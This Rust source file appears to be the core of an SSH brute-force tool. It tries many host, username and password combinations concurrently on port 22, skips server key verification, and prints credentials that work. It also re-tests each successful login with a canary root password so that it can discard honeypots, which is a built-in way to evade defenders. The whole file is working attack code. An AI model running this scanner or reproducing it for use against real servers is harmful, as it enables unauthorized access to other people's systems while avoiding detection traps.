extern crate thrussh;
extern crate thrussh_keys;
extern crate futures;
extern crate tokio;
extern crate tokio_stream;
extern crate indicatif;

use crate::args;

use thrussh::*;
use thrussh::client::*;
use thrussh_keys::*;
use std::string::String;
use std::sync::Arc;
use indicatif::{ProgressBar, ProgressStyle};
use futures::stream::{self, StreamExt};

struct Client {
}

const CANARY_USER: &str = "root";
const CANARY_PASS: &str = "definitelynotarealpasswordthereisnowaythiswillmatch";

impl client::Handler for Client {
   type Error = anyhow::Error;
   type FutureUnit = futures::future::Ready<Result<(Self, client::Session), anyhow::Error>>;
   type FutureBool = futures::future::Ready<Result<(Self, bool), anyhow::Error>>;

   fn finished_bool(self, b: bool) -> Self::FutureBool {
       futures::future::ready(Ok((self, b)))
   }
   fn finished(self, session: client::Session) -> Self::FutureUnit {
       futures::future::ready(Ok((self, session)))
   }
   fn check_server_key(self, _server_public_key: &key::PublicKey) -> Self::FutureBool {
       self.finished_bool(true)
   }
   fn channel_open_confirmation(self, _channel: ChannelId, _max_packet_size: u32, _window_size: u32, session: client::Session) -> Self::FutureUnit {
       self.finished(session)
   }
   fn data(self, _channel: ChannelId, _data: &[u8], session: client::Session) -> Self::FutureUnit {
       self.finished(session)
   }
}

pub struct Scanner {
    config: args::Config,
    pb: ProgressBar,
}

impl Scanner {

    async fn test_honeypot(&self, host:String) -> Result<bool, &'static str> {
	let config: Arc<Config> = Arc::new(thrussh::client::Config::default());
	let client: Client = Client{};
	let session = thrussh::client::connect(config, format!("{}:22", host), client).await;
	match session {
	    Ok(mut s) => {
		let auth = s.authenticate_password(CANARY_USER, CANARY_PASS).await;
		match auth {
		    Ok(a) => {
			return Ok(a);
		    },
		    Err(_e) => return Err("Not a honeypot, login failed"),
		}
	    },
	    Err(_e) => Err("Could not connect to host, not a honeypot"),
	}
    }

    async fn try_login(&self, login:args::Login) -> Result<bool, &'static str> {
	let config: Arc<Config> = Arc::new(thrussh::client::Config::default());
	let client: Client = Client{};
	let session = thrussh::client::connect(config, format!("{}:22", login.host), client).await;
	let message = format!("{} {} {}", login.host, login.user, login.password);
	match session {
	    Ok(mut s) => {
		let auth = s.authenticate_password(login.user, login.password).await;
		self.pb.set_message(&message);
		self.pb.inc(1);
		match auth {
		    Ok(true) => {
			let hp_test = self.test_honeypot(login.host).await;
			match hp_test {
			    Ok(true) => {
				return Err("Host is a honeypot");
			    },
			    Ok(false) => {
				self.pb.println(message);
				return Ok(true);
			    },
			    Err(e) => return Err(e),
			}
		    },
		    Ok(false) => {
			return Err("Login failed")
		    }
		    Err(_e) => Err("Could not auth")
		}
	    },
	    Err(_e) => Err("Could not connect to host"),
	}
    }

    pub async fn run(&self) -> Result<bool, &'static str> {
	
	self.pb.set_style(ProgressStyle::default_bar()
		     .template("{spinner:.green} {elapsed_precise} {msg} [{wide_bar}] [{pos}/{len}] ({eta}@{per_sec})")
		     .progress_chars("=> "));
	self.pb.println("Building task queue...");

	let mut login_futures = Vec::new();
	for login in &self.config.logins {
	    login_futures.push(self.try_login(login.clone()))
	}
	let login_stream = stream::iter(login_futures);
	let buffer = login_stream.buffer_unordered(self.config.limit as usize);
	let _results = buffer.collect::<Vec<Result<bool, &'static str>>>().await;
	
	self.pb.finish_with_message("scan complete");
	return Ok(true);
    }

    pub fn new(config:args::Config) -> Result<Scanner, &'static str> {
	let count = config.login_count as u64;
	Ok(Scanner{
	    config: config,
	    pb: ProgressBar::new(count),
	})
    }
}
